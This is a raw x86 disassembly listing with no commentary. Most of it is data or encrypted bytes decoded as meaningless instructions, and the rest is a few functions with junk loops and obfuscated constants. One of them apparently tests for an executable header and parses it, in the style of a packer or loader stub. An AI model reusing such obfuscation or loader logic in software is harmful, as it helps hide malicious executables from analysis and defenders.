  410166:	jbe    0x410130
  410168:	ficomp DWORD PTR [ebx+edx*2+0x2b46de06]
  41016f:	and    eax,0x544cf9c8
  410174:	into   
  410175:	rol    DWORD PTR [ebx],0x3
  410178:	ins    DWORD PTR es:[edi],dx
  410179:	jae    0x410151
  41017b:	fistp  DWORD PTR [ebp-0x5faaec37]
  410181:	loope  0x4101f7
  410183:	xor    eax,0x8412228d
  410188:	fld    TBYTE PTR [edi]
  41018a:	pop    ecx
  41018b:	lea    esi,[esi]
  41018d:	call   0x9ad7:0x2207dd67
  410194:	outs   dx,BYTE PTR ds:[esi]
  410195:	sbb    esi,DWORD PTR [esi-0x5f]
  410198:	cmp    eax,0xb1fd07ab
  41019d:	cmc    
  41019e:	stc    
  41019f:	inc    esi
  4101a0:	mov    ds:0x81631ebd,al
  4101a5:	hlt    
  4101a6:	add    DWORD PTR [ebp+0x4e6331ef],esi
  4101ac:	jmp    DWORD PTR ds:0x775b8ad4
  4101b2:	inc    edi
  4101b3:	xor    DWORD PTR [edi+edx*4+0x732d9dad],esi
  4101ba:	enter  0xeeaf,0x99
  4101be:	and    al,bl
  4101c0:	fldcw  WORD PTR [ebx-0x10]
  4101c3:	test   eax,0xbf5bc9ed
  4101c8:	call   0x1153:0x82c6d40a
  4101cf:	mov    fs:0x34fbbeb8,eax
  4101d5:	rol    BYTE PTR [edi+0x8],cl
  4101d8:	sbb    esp,DWORD PTR [esi]
  4101da:	loope  0x41021b
  4101dc:	int    0x98
  4101de:	and    al,0x79
  4101e0:	ds dec eax
  4101e2:	xchg   ecx,eax
  4101e3:	into   
  4101e4:	dec    eax
  4101e5:	into   
  4101e6:	sbb    DWORD PTR [esi],esi
  4101e8:	loopne 0x410227
  4101ea:	arpl   WORD PTR [ebx+0x5e],cx
  4101ed:	or     eax,0x7ff6175f
  4101f2:	outs   dx,BYTE PTR ds:[esi]
  4101f3:	mov    eax,ds:0xd78e6bf
  4101f8:	ins    DWORD PTR es:[edi],dx
  4101f9:	xor    DWORD PTR [ecx-0x4e],edx
  4101fc:	std    
  4101fd:	sar    DWORD PTR [eax],0xc7
  410200:	in     al,0xc7
  410202:	scas   eax,DWORD PTR es:[edi]
  410203:	and    BYTE PTR [edx-0x42ffb4a7],0x6e
  41020a:	call   0xa2aa:0x3f33349
  410211:	mov    cl,0xe6
  410213:	cmp    esi,DWORD PTR [eax+0x4a]
  410216:	push   ss
  410217:	mov    ebx,0x2cc48ffd
  41021c:	push   edi
  41021d:	call   FWORD PTR [ebp+0x4a0f0e9b]
  410223:	stos   BYTE PTR es:[edi],al
  410224:	lods   al,BYTE PTR ds:[esi]
  410225:	fidivr WORD PTR [edx]
  410227:	lds    ebp,FWORD PTR [edi+0x73]
  41022a:	paddsw mm0,QWORD PTR [ebx]
  41022d:	mov    DWORD PTR [eax-0x9],0xeccc5a75
  410234:	add    eax,0x8c7ec7a5
  410239:	mov    ds:0x8752943c,al
  41023e:	stos   DWORD PTR es:[edi],eax
  41023f:	cmp    eax,0x2a868021
  410244:	in     al,dx
  410245:	mov    ebx,0x44737947
  41024a:	push   cs
  41024b:	addr16 adc edx,eax
  41024e:	(bad)  
  410250:	sbb    eax,0x346490ce
  410255:	jle    0x41027e
  410257:	mov    ds:0xfb6217f8,al
  41025c:	cmp    ah,BYTE PTR [edx]
  41025e:	into   
  41025f:	jo     0x410203
  410261:	rol    DWORD PTR [esi],0xac
  410264:	es out 0xc7,al
  410267:	xor    BYTE PTR [ebp+0x36b6f3f6],bl
  41026d:	aam    0xf6
  41026f:	bnd jne 0x410264
  410272:	mov    DWORD PTR [ebp+ecx*8+0x24],0xc92314d5
  41027a:	push   ebp
  41027b:	jl     0x410220
  41027d:	sahf   
  41027e:	pop    ss
  41027f:	syscall 
  410281:	out    dx,eax
  410282:	scas   eax,DWORD PTR es:[edi]
  410283:	pop    ds
  410284:	fs lahf 
  410286:	or     ch,0x13
  410289:	and    DWORD PTR [eax-0x173243ef],ebp
  41028f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410290:	push   cs
  410291:	jo     0x410260
  410293:	mov    edx,gs
  410295:	dec    esi
  410296:	pop    esi
  410297:	rcl    BYTE PTR [ecx+ecx*4],1
  41029a:	add    BYTE PTR ds:0xeeeefc69,ah
  4102a0:	ins    DWORD PTR es:[edi],dx
  4102a1:	mov    al,ds:0x8ed833c0
  4102a6:	cmp    ebx,esi
  4102a8:	scas   eax,DWORD PTR es:[edi]
  4102a9:	stos   DWORD PTR es:[edi],eax
  4102aa:	mov    eax,ds:0xdd644de9
  4102af:	sub    BYTE PTR [eax],bl
  4102b1:	lea    ebx,[ecx+0x3a]
  4102b4:	mov    ecx,0xc9ba7284
  4102b9:	jp     0x4102b7
  4102bb:	dec    ebx
  4102bc:	and    ch,ch
  4102be:	jb     0x410334
  4102c0:	pop    esp
  4102c1:	mov    ebp,0x5d10851d
  4102c6:	inc    ebx
  4102c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102c8:	(bad)
  4102cb:	jne    0x41030f
  4102cd:	push   edi
  4102ce:	inc    ebx
  4102cf:	int3   
  4102d0:	sbb    dl,al
  4102d2:	mov    edi,0xaea19495
  4102d7:	and    ebp,DWORD PTR [eax]
  4102d9:	sahf   
  4102da:	mov    ds:0xf18aae8e,al
  4102df:	xor    edx,DWORD PTR [ecx+0xe]
  4102e2:	jne    0x4102e4
  4102e4:	inc    esp
  4102e5:	jmp    0xcf1b:0xc0b2460b
  4102ec:	fcmove st,st(3)
  4102ee:	(bad)  
  4102ef:	repnz adc DWORD PTR [ecx-0x5b],0xe62b05b
  4102f7:	fnsave [ecx-0x746e8f7]
  4102fd:	aaa    
  4102fe:	mov    al,ds:0x39af0f89
  410303:	test   DWORD PTR [edx+ebp*4+0x70],edi
  410307:	jo     0x4102dd
  410309:	xchg   ebx,eax
  41030a:	fwait
  41030b:	cmp    ch,BYTE PTR [edi-0x19]
  41030e:	push   esp
  41030f:	popa   
  410310:	inc    eax
  410311:	or     BYTE PTR [ebx],cl
  410313:	in     al,0xd0
  410315:	push   0xb523df10
  41031a:	and    dh,BYTE PTR [eax-0x2b79ea9e]
  410320:	push   es
  410321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410322:	push   cs
  410323:	push   ss
  410324:	and    ch,BYTE PTR [ebp+0x6f688cba]
  41032a:	push   ecx
  41032b:	or     ch,BYTE PTR [ebx+0x723cd43b]
  410331:	jo     0x41031c
  410333:	imul   ecx,DWORD PTR [edx+0x74],0x4ce6dbdf
  41033a:	inc    edi
  41033b:	int    0x5b
  41033d:	cld    
  41033e:	or     BYTE PTR ds:0xb356bfb7,bl
  410344:	ret    
  410345:	sbb    eax,DWORD PTR [ecx+edi*1]
  410348:	and    BYTE PTR [ecx-0x3a011836],0x9c
  41034f:	mov    ds:0x33a4ad35,al
  410354:	ss out 0xb9,al
  410357:	mov    bh,0x5b
  410359:	(bad)  
  41035a:	cmp    ah,dl
  41035c:	mov    dl,0x6c
  41035e:	aad    0x20
  410360:	push   ecx
  410361:	sub    ecx,DWORD PTR [esi]
  410363:	bound  ebx,QWORD PTR ds:0x63c0ba6d
  410369:	push   esi
  41036a:	out    dx,al
  41036b:	inc    esp
  41036c:	cli    
  41036d:	leave  
  41036e:	jno    0x41031c
  410370:	pop    edi
  410371:	gs push ebp
  410373:	cmp    eax,0x8b4fe77
  410378:	aaa    
  410379:	(bad)  
  41037b:	xor    al,0x3d
  41037d:	fstp   QWORD PTR [edi+0x29]
  410380:	mov    ecx,0xf7e3b7db
  410385:	jne    0x410352
  410387:	out    dx,eax
  410388:	push   ds
  410389:	in     eax,0xcf
  41038b:	aad    0xd0
  41038d:	addr16 ja 0x41033f
  410390:	test   eax,0x96e0d84
  410395:	or     ebp,DWORD PTR fs:[ebx+0x561bd313]
  41039c:	or     eax,0x86b3c802
  4103a1:	data16 fwait
  4103a3:	loopne 0x41033c
  4103a5:	sbb    ch,cl
  4103a7:	sbb    dl,dh
  4103a9:	ret    
  4103aa:	xchg   ah,ch
  4103ac:	mov    ebx,0xc50dd37
  4103b1:	fcom   DWORD PTR [edi-0xe]
  4103b4:	dec    edx
  4103b5:	fistp  WORD PTR [edi]
  4103b7:	mov    cl,0x73
  4103b9:	add    dl,BYTE PTR [edi-0x80]
  4103bc:	xor    eax,0x4b6dce1c
  4103c1:	and    BYTE PTR [eax],al
  4103c3:	xor    eax,0x2ebfb786
  4103c8:	jp     0x4103ef
  4103ca:	mov    edx,DWORD PTR [ecx-0x42a6bcd1]
  4103d0:	(bad)  
  4103d1:	cwde   
  4103d2:	pusha  
  4103d3:	retf   0xcd6d
  4103d6:	aad    0xf2
  4103d8:	add    BYTE PTR ss:[edx-0x4e],bh
  4103dc:	sti    
  4103dd:	loop   0x410374
  4103df:	and    esi,DWORD PTR [edx-0x78ec2d97]
  4103e5:	add    dh,BYTE PTR [ecx-0x48]
  4103e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103e9:	mov    eax,0x66993a39
  4103ee:	gs cmp al,0xd9
  4103f1:	xor    bh,ah
  4103f3:	cmp    DWORD PTR [ecx+0x178a10a3],0xb8e8d5b5
  4103fd:	adc    al,0xbf
  4103ff:	ss neg ebx
  410402:	xchg   ebp,eax
  410403:	outs   dx,DWORD PTR ds:[esi]
  410404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410405:	cli    
  410406:	popa   
  410407:	(bad)  
  410408:	sbb    eax,0x9ac20c8b
  41040d:	push   eax
  41040e:	outs   dx,DWORD PTR ds:[esi]
  41040f:	pop    edi
  410410:	cld    
  410411:	inc    esp
  410412:	xchg   edx,eax
  410413:	enter  0x7e2b,0xbb
  410417:	arpl   WORD PTR [ecx-0x58e51b45],dx
  41041d:	mov    dl,0x2f
  41041f:	jmp    0x410475
  410421:	push   ebp
  410422:	test   al,0x9d
  410424:	sub    eax,0x99a42ebd
  410429:	lods   eax,DWORD PTR ds:[esi]
  41042a:	je     0x410482
  41042c:	sbb    BYTE PTR [esi-0x1c8305bd],dh
  410432:	popa   
  410433:	jo     0x410485
  410435:	les    edi,FWORD PTR [ebp+ecx*1-0x45]
  410439:	mov    edx,0xadc7457d
  41043e:	repz int 0x5c
  410441:	jmp    0x1e7e966
  410446:	jmp    0x410489
  410448:	xchg   cl,al
  41044a:	add    eax,0x196f276f
  41044f:	leave  
  410450:	pushf  
  410451:	mov    ds:0x24b2c91,eax
  410456:	mov    ds:0xabbefa8a,al
  41045b:	dec    edx
  41045c:	sahf   
  41045d:	xor    eax,0x12b3c049
  410462:	cmp    ah,BYTE PTR [ecx+edx*2+0x20f5761b]
  410469:	outs   dx,DWORD PTR ds:[esi]
  41046a:	icebp  
  41046b:	lods   eax,DWORD PTR ds:[esi]
  41046c:	cmp    bh,BYTE PTR [ebx]
  41046e:	sub    BYTE PTR [ebp+0x6f3dfa8e],bh
  410474:	mov    esp,0x9c2d5d5d
  410479:	in     al,0x3c
  41047b:	aad    0xa0
  41047d:	xor    bl,BYTE PTR [edx-0x3878a538]
  410483:	(bad)  
  410484:	popf   
  410485:	sbb    eax,0xe2071637
  41048a:	mov    eax,0xbb45dc52
  41048f:	imul   eax,eax,0x5
  410492:	mov    bl,0xeb
  410494:	into   
  410495:	idiv   esi
  410497:	xchg   eax,ecx
  410499:	push   eax
  41049a:	leave  
  41049b:	adc    al,0x45
  41049e:	xchg   DWORD PTR [eax],ebp
  4104a0:	mov    eax,ds:0xbc9fd831
  4104a5:	pop    ebx
  4104a6:	cwde   
  4104a7:	(bad)  
  4104a8:	aas    
  4104a9:	fisub  DWORD PTR [edi+0x1c]
  4104ac:	out    dx,al
  4104ad:	int    0xca
  4104af:	inc    edx
  4104b0:	push   edx
  4104b1:	mov    esi,ebp
  4104b3:	lahf   
  4104b4:	cmp    ebx,esp
  4104b6:	mov    eax,DWORD PTR [ebx]
  4104b8:	(bad)  
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4344f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4344f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4344f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4344f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4344f7
  410508:	dec    eax
  410509:	mov    ds:0x4344f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4344f7
  410516:	dec    eax
  410517:	mov    ds:0x4344f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434547,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43458f,0x434613
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43454f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434587
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4344eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4344eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4344eb,edx
  410571:	cmp    DWORD PTR ds:0x4344eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4344eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4344eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4344eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4344eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	pop    eax
  4105ed:	loop   0x410579
  4105ef:	sub    dh,dh
  4105f1:	inc    edi
  4105f2:	jle    0x410672
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x41057f
  4105f9:	out    dx,al
  4105fa:	xchg   ecx,eax
  4105fb:	mov    edx,0x58b13fee
  410600:	rep outs dx,DWORD PTR ds:[esi]
  410602:	ja     0x410672
  410604:	shl    DWORD PTR [ecx-0x49],cl
  410607:	in     eax,dx
  410608:	retf   
  410609:	data16 jg 0x410603
  41060c:	cli    
  41060d:	into   
  41060e:	jmp    0x790ff9a9
  410613:	test   DWORD PTR [eax-0x7],esp
  410616:	adc    al,0x33
  410618:	repz mul ebp
  41061b:	xchg   esp,eax
  41061c:	sub    al,0xea
  41061e:	call   0xaff:0xdaedaaa6
  410625:	loope  0x410645
  410627:	fisttp QWORD PTR [ebx-0x6a]
  41062a:	aam    0xa0
  41062c:	push   ecx
  41062d:	xor    al,0xd0
  41062f:	scas   eax,DWORD PTR es:[edi]
  410630:	mov    ah,0x7
  410632:	mov    ebp,0x9c9eb363
  410637:	loope  0x410651
  410639:	les    ecx,FWORD PTR [eax]
  41063b:	scas   eax,DWORD PTR es:[edi]
  41063c:	mov    eax,0xdc144f70
  410641:	js     0x4106b5
  410643:	dec    eax
  410644:	in     al,dx
  410645:	gs mov esp,0xf57994a2
  41064b:	dec    edi
  41064c:	imul   edx,DWORD PTR [ecx+edi*2+0x7b],0xbf20c567
  410654:	add    al,0xad
  410656:	fistp  QWORD PTR [edi+ecx*8-0x80]
  41065a:	or     eax,0x6926296d
  41065f:	div    BYTE PTR [esi-0x467a7497]
  410665:	addr16 mov esi,0xb640c32f
  41066b:	loope  0x410626
  41066d:	fist   WORD PTR [ecx+0x1f]
  410670:	pop    edx
  410671:	sbb    ecx,edx
  410673:	sub    ebp,DWORD PTR [esi+0x3e445beb]
  410679:	mov    eax,ds:0x5e580d39
  41067e:	jne    0x97104a8c
  410684:	ds aad 0xea
  410687:	call   0xe5f4d7cd
  41068c:	jecxz  0x4106f9
  41068e:	mov    bh,0x6e
  410690:	push   ss
  410691:	out    0xa2,al
  410693:	jns    0x4106db
  410695:	cld    
  410696:	fld    QWORD PTR [ecx-0x1]
  410699:	and    al,dh
  41069b:	nop
  41069c:	(bad)
  41069f:	mov    ebp,0x3b384a53
  4106a4:	mov    gs,ebp
  4106a6:	push   ds
  4106a7:	ins    BYTE PTR es:[edi],dx
  4106a8:	jge    0x410684
  4106aa:	cwde   
  4106ab:	imul   edx,DWORD PTR [eax+0x5f8e4a02],0x5203969d
  4106b5:	xor    al,0x83
  4106b7:	mov    ds:0x7cbf8e84,al
  4106bc:	pop    ss
  4106bd:	test   BYTE PTR [ecx+eax*2-0x62],ch
  4106c1:	dec    esp
  4106c2:	inc    esi
  4106c3:	loopne 0x4106f8
  4106c5:	adc    BYTE PTR [esi],cl
  4106c7:	ss test eax,0x5ebc72b0
  4106cd:	mov    WORD PTR [ecx+0x10],ds
  4106d0:	scas   al,BYTE PTR es:[edi]
  4106d1:	xlat   BYTE PTR ds:[ebx]
  4106d2:	fwait
  4106d3:	dec    edx
  4106d4:	in     eax,0x6e
  4106d6:	adc    esi,DWORD PTR [ebp+0x46]
  4106d9:	mov    ss,WORD PTR [eax]
  4106db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106dc:	jbe    0x4106bf
  4106de:	je     0x4106a0
  4106e0:	mov    WORD PTR [edx-0x209b3529],?
  4106e6:	stos   BYTE PTR es:[edi],al
  4106e7:	mov    cl,0xd2
  4106e9:	call   0x84ddf00c
  4106ee:	test   eax,0xe803df3c
  4106f3:	pop    ss
  4106f4:	cmp    dh,al
  4106f6:	outs   dx,BYTE PTR ds:[esi]
  4106f7:	ins    DWORD PTR es:[edi],dx
  4106f8:	mov    esi,DWORD PTR [edx-0x46]
  4106fb:	mov    ?,WORD PTR [ebx+0x3f9ef3cb]
  410701:	in     eax,0x42
  410703:	xor    al,0xd0
  410705:	imul   edi,DWORD PTR ds:0xbc59f367,0x1ee20b69
  41070f:	add    al,0x5c
  410711:	jp     0x4106f3
  410713:	imul   esi,DWORD PTR [edi+ebp*2+0x5bb7ee9a],0xffffffc2
  41071b:	pop    es
  41071c:	adc    ebp,ebp
  41071e:	xchg   ebp,eax
  41071f:	mov    dl,0xeb
  410721:	and    eax,0xd265063d
  410726:	gs dec esp
  410728:	xor    ebx,DWORD PTR [edi+eiz*4-0x32]
  41072c:	es push cs
  41072e:	xchg   esp,eax
  41072f:	inc    esp
  410730:	push   cs
  410731:	ins    DWORD PTR es:[edi],dx
  410732:	cmc    
  410733:	daa    
  410734:	mul    DWORD PTR [ebp+0x257216ff]
  41073a:	dec    esi
  41073b:	imul   edx,DWORD PTR [esp+ecx*2-0x4a],0x4e73140
  410743:	aaa    
  410744:	xor    dh,ch
  410746:	(bad)
  41074a:	push   ds
  41074b:	test   al,0x93
  41074d:	je     0x410704
  41074f:	out    dx,eax
  410750:	pop    ecx
  410751:	das    
  410752:	xor    ch,BYTE PTR [edx]
  410754:	xchg   ecx,eax
  410755:	nop
  410756:	adc    esp,DWORD PTR [edi+esi*1+0x3dbe75bf]
  41075d:	aam    0x1c
  41075f:	lea    edx,[edx]
  410761:	(bad)  
  410762:	mov    ds:0x6831f319,eax
  410767:	adc    esi,eax
  410769:	xor    DWORD PTR [ebx],esp
  41076b:	mov    al,ds:0xdaef08ed
  410770:	inc    ebx
  410771:	les    ecx,FWORD PTR ds:0x4e323c7c
  410777:	shr    esi,cl
  410779:	inc    ecx
  41077a:	aam    0xa1
  41077c:	sbb    BYTE PTR [edi+edx*2+0x2f],bl
  410780:	mov    ah,BYTE PTR [eax]
  410782:	push   ss
  410783:	lea    edi,[ecx+0x1d]
  410786:	jne    0x4107a6
  410788:	fbld   TBYTE PTR [esp+edi*1]
  41078b:	pop    ebp
  41078c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41078d:	xor    al,0xcc
  410790:	adc    edi,DWORD PTR [ebx-0x47]
  410793:	fs inc esi
  410795:	ins    BYTE PTR es:[edi],dx
  410796:	mov    esi,DWORD PTR [ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	ror    BYTE PTR [esi+0x41146d5c],1
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x4107e7
  4107bc:	mov    cl,0x3b
  4107be:	mov    dl,0xf6
  4107c0:	out    dx,eax
  4107c1:	fidiv  DWORD PTR [eax+ebx*2-0x46]
  4107c5:	mov    ds:0x7ec4b3b1,al
  4107ca:	inc    ebp
  4107cb:	fist   WORD PTR [eax+0x1]
  4107ce:	fisubr WORD PTR [edi]
  4107d0:	aad    0xc7
  4107d2:	leave  
  4107d3:	dec    ecx
  4107d4:	pop    eax
  4107d5:	cwde   
  4107d6:	ret    
  4107d7:	xchg   esp,eax
  4107d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107d9:	mov    eax,ds:0x913c8a74
  4107de:	test   esp,ebp
  4107e0:	and    DWORD PTR [edi+edi*8-0x2cd92c99],0x6eea0d18
  4107eb:	ret    
  4107ec:	test   al,0x7d
  4107ee:	jne    0x4107bc
  4107f0:	add    DWORD PTR [edi],0x1a99900a
  4107f6:	pop    es
  4107f7:	mov    edx,0x359ba4b8
  4107fc:	es mov edi,0x442c12d0
  410802:	mov    ah,0x7
  410804:	ret    0xf02c
  410807:	mov    edx,0xdf84ca2e
  41080c:	inc    ebp
  41080d:	add    dl,dh
  41080f:	in     al,0x84
  410811:	pop    eax
  410812:	push   ebp
  410813:	test   BYTE PTR [ebx-0x63a0ea49],dl
  410819:	xor    BYTE PTR [ebx+edi*1],al
  41081c:	inc    edx
  41081d:	pop    eax
  41081e:	xchg   ebx,eax
  41081f:	jle    0x4107e2
  410821:	mov    edx,0x1294be0b
  410826:	test   BYTE PTR [ebp-0x752deccd],dh
  41082c:	pusha  
  41082d:	cmp    BYTE PTR [ebx],dl
  41082f:	dec    esp
  410830:	es cmp eax,0x4e3b86c7
  410836:	inc    esi
  410837:	pop    ebp
  410838:	dec    esp
  410839:	shl    DWORD PTR [eax+0x2d52c1a9],0xf7
  410840:	fisttp QWORD PTR [ebp+eiz*2-0x797ef56b]
  410847:	jg     0x4107dc
  410849:	xchg   ebx,eax
  41084a:	jae    0x410841
  41084c:	fild   DWORD PTR [ebx-0x43]
  41084f:	cmp    ah,BYTE PTR [ecx]
  410851:	xchg   edi,eax
  410852:	sub    BYTE PTR [esi-0x6b1c6f46],dh
  410858:	sub    BYTE PTR [ebp+0x15],dh
  41085b:	push   edx
  41085c:	(bad)  
  41085e:	dec    ebp
  41085f:	in     eax,dx
  410860:	out    0xd3,al
  410862:	mov    ebx,DWORD PTR [eax+0x4600e0be]
  410868:	lock shl DWORD PTR [ebx],0x3d
  41086c:	nop
  41086d:	lods   al,BYTE PTR ds:[esi]
  41086e:	pop    ecx
  41086f:	mov    eax,?
  410871:	cs inc eax
  410873:	lds    esi,FWORD PTR [ecx+0x6747adec]
  410879:	adc    edi,DWORD PTR [ecx]
  41087b:	dec    eax
  41087c:	into   
  41087d:	sbb    al,al
  41087f:	ins    BYTE PTR es:[edi],dx
  410880:	cdq    
  410881:	or     BYTE PTR [edi-0x4e8ee8],cl
  410887:	pop    ss
  410888:	and    BYTE PTR [ecx],0x50
  41088b:	dec    eax
  41088c:	in     eax,0xb
  41088e:	inc    esp
  41088f:	mov    al,0x66
  410891:	or     eax,0x32b5662a
  410896:	mov    bh,0x42
  410898:	pop    ds
  410899:	mov    esi,0x6ed531c4
  41089e:	icebp  
  41089f:	mov    ecx,0x6a4f91f2
  4108a4:	mov    ebp,0xcba824c8
  4108a9:	lahf   
  4108aa:	pop    esp
  4108ab:	jmp    0x4108fc
  4108ad:	ja     0x410836
  4108af:	test   al,0xdb
  4108b1:	jge    0x410928
  4108b3:	mov    ah,0xae
  4108b5:	popf   
  4108b6:	pop    esi
  4108b7:	and    al,0xfe
  4108b9:	call   0x428b:0xf753b327
  4108c0:	fwait
  4108c1:	pop    edx
  4108c2:	leave  
  4108c3:	cwde   
  4108c4:	int3   
  4108c5:	mov    al,0xc1
  4108c7:	cmp    ebp,eax
  4108c9:	mov    dh,0x7e
  4108cb:	(bad)  
  4108cc:	retf   
  4108cd:	lds    edx,FWORD PTR [ecx]
  4108cf:	or     BYTE PTR [ecx+0x4d],0x4a
  4108d3:	xchg   edx,eax
  4108d4:	lds    ebx,FWORD PTR [ecx+0x52a6d31f]
  4108da:	lahf   
  4108db:	mov    bl,0xef
  4108dd:	enter  0xd752,0x59
  4108e1:	jmp    0x410920
  4108e3:	xlat   BYTE PTR ds:[ebx]
  4108e4:	jecxz  0x410883
  4108e6:	or     DWORD PTR [edx],esp
  4108e8:	xchg   edx,eax
  4108e9:	push   es
  4108ea:	test   eax,0xe8b88d22
  4108ef:	or     al,BYTE PTR fs:[edi-0x2c2277b1]
  4108f6:	mov    ah,0xf5
  4108f8:	jp     0x4108f1
  4108fa:	cmp    BYTE PTR fs:[ecx+0x6e],bh
  4108fe:	in     eax,dx
  4108ff:	test   ah,bh
  410901:	sbb    cl,BYTE PTR [esp+edx*2-0x1068ab27]
  410908:	out    0xe4,al
  41090a:	xchg   edx,eax
  41090b:	jmp    0x41098b
  41090d:	or     DWORD PTR ds:0x191392a,0x39062d56
  410917:	fwait
  410918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410919:	pop    es
  41091a:	pop    bx
  41091c:	cmp    cl,0x38
  41091f:	dec    ecx
  410920:	in     al,dx
  410921:	ss push 0x9
  410924:	aaa    
  410925:	mov    ah,0x9d
  410927:	pop    ss
  410928:	or     DWORD PTR [edi+0xd],edi
  41092b:	pop    esp
  41092c:	lds    esp,FWORD PTR [edi]
  41092e:	and    DWORD PTR [ebx-0x5e],edx
  410931:	test   BYTE PTR [esi],bl
  410933:	(bad)  
  410934:	ret    
  410935:	and    bl,dh
  410937:	hlt    
  410938:	inc    eax
  410939:	hlt    
  41093a:	or     eax,0x12ac2cdf
  41093f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410940:	lds    ebp,FWORD PTR [eax+0x762c780a]
  410946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410947:	sbb    ebp,DWORD PTR [eax-0x17dbce2e]
  41094d:	rol    cl,cl
  41094f:	ins    DWORD PTR es:[edi],dx
  410950:	sub    esi,DWORD PTR [ecx]
  410952:	repz ds dec ebp
  410955:	ror    DWORD PTR [eax-0x3efc6535],1
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4344ef,0x0
  41099b:	mov    eax,ds:0x4344ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4344ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4344ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4344ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4344ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4344ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4344ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4345cf
  4109f5:	adc    DWORD PTR ds:0x4344e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4345bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434507,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
